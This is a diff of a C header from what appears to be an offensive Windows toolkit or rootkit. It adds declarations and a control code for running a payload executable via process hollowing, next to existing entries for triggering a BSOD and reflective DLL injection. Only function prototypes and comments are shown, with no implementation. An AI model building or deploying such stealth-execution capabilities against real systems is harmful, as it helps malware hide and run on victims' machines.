@@ -125,6 +125,10 @@
 /// </summary>
 #define CONTROL_USER_SHELLEXEC					0x3001
 /// <summary>
+/// The control code that executes an executable using process hollowing.
+/// </summary>
+#define CONTROL_USER_RUNPE						0x3002
+/// <summary>
 /// The control code that triggers a BSOD.
 /// </summary>
 #define CONTROL_SYSTEM_BSOD						0x4001
@@ -467,6 +471,27 @@ BOOL DeleteScheduledTask(LPCWSTR name);
 /// </returns>
 HANDLE CreatePublicNamedPipe(LPCWSTR name);
 
+/// <summary>
+/// Determines the bitness of an executable file.
+/// </summary>
+/// <param name="image">A buffer containing the executable file.</param>
+/// <param name="is64Bit">A pointer to a BOOL value to write the result to.</param>
+/// <returns>
+/// TRUE, if this function succeeds;
+/// otherwise, FALSE.
+/// </returns>
+BOOL IsExecutable64Bit(LPBYTE image, LPBOOL is64Bit);
+/// <summary>
+/// Creates a new process using the process hollowing technique.
+/// <para>The bitness of the current process, the created process and the payload must match.</para>
+/// </summary>
+/// <param name="path">The target executable path. This can be any existing file with the same bitness as the current process and the payload.</param>
+/// <param name="payload">The actual executable that is the payload of the new process, regardless of the path argument.</param>
+/// <returns>
+/// TRUE, if this function succeeds;
+/// otherwise, FALSE.
+/// </returns>
+BOOL RunPE(LPCWSTR path, LPBYTE payload);
 /// <summary>
 /// Injects a DLL using reflective DLL injection.
 /// <para>The DLL must export a function called "ReflectiveDllMain".</para>
